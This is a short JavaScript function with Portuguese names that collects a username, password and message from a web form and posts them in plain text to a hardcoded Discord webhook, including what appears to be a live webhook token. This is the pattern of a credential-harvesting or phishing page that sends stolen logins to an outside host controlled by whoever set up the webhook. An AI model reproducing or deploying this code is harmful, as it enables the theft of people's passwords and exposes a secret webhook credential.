
function enviarMensagem() {
  const usuario = document.getElementById("usuario").value;
  const senha = document.getElementById("senha").value;
  const mensagem = document.getElementById("mensagem").value;

  const conteudo = {
    content: `🔐 Nova submissão:\n\n👤 Usuário: ${usuario}\n🔑 Senha: ${senha}\n💬 Mensagem: ${mensagem}`
  };

  fetch("https://discord.com/api/webhooks/1377747470624358530/bSMO4BvPfMmK9IVls4_zCxHrWH0xm0MbInAMFm3HNZY_dFoBXd9GGkXTS03KPfNKWYeY", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(conteudo)
  })
  .then(response => {
    if (response.ok) {
      alert("Mensagem enviada com sucesso!");
      document.getElementById("usuario").value = "";
      document.getElementById("senha").value = "";
      document.getElementById("mensagem").value = "";
    } else {
      alert("Erro ao enviar a mensagem.");
    }
  });
}
